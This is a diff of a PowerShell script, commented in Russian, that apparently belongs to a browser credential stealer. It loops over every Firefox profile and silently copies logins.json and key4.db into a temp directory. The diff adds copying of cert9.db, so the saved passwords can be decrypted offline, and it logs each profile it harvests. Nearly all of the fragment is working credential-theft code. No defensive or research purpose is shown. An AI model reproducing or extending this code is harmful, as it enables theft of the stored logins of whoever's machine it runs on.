@@ -55,6 +55,7 @@ foreach ($b in $browsers) {
 }
 
 # 2. СБОР ДАННЫХ FIREFOX
+# --- ОБНОВЛЕННЫЙ БЛОК ДЛЯ FIREFOX ---
 $ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
 if (Test-Path $ffPath) {
     $ffProfiles = Get-ChildItem -Path $ffPath -Directory -ErrorAction SilentlyContinue
@@ -62,14 +63,18 @@ if (Test-Path $ffPath) {
         $label = "Firefox_$($profile.Name)"
         $loginsJson = Join-Path $profile.FullName "logins.json"
         $keyDb = Join-Path $profile.FullName "key4.db"
+        $certDb = Join-Path $profile.FullName "cert9.db" # Добавили путь к базе сертификатов
         
-        # Если есть файл с логинами, забираем его и базу ключей
         if (Test-Path $loginsJson) {
             Copy-Item $loginsJson -Destination "$tempDir\$($label)_logins.json" -Force -ErrorAction SilentlyContinue
             if (Test-Path $keyDb) {
                 Copy-Item $keyDb -Destination "$tempDir\$($label)_key4.db" -Force -ErrorAction SilentlyContinue
             }
-            $logLine = "[$($label)] Found Firefox profile. Database and JSON copied."
+            # Копируем cert9.db, если он существует
+            if (Test-Path $certDb) {
+                Copy-Item $certDb -Destination "$tempDir\$($label)_cert9.db" -Force -ErrorAction SilentlyContinue
+            }
+            $logLine = "[$($label)] Found Firefox profile. All necessary files copied."
             Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
         }
     }
